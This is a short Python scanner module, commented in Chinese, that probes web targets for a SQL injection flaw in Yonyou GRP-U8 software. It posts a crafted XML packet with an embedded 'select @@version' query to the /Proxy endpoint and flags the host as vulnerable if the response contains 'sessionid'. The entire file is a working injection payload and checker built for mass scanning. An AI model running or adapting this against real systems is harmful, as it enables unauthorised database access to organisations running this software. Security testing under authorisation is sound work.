#!/usr/bin/env python
# coding=utf-8
#用友GRP-U8sql注入
import requests, threading
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''
def pscan_vuln(url):
    urls = url
    global results
    try:
        data = 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>'
        response = requests.post(url=url +'/Proxy', verify=False,timeout=20,data=data)
        if 'sessionid' in response.text:
            print(colored('[+]存在用友GRP-U8sql注入', 'red'))
            results = f'{urls}-->存在用友GRP-U8sql注入'
        else:
            print('[-]不存在用友GRP-U8sql注入')
    except:
        print('[-]不存在用友GRP-U8sql注入')


def YPGRPSQL(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results
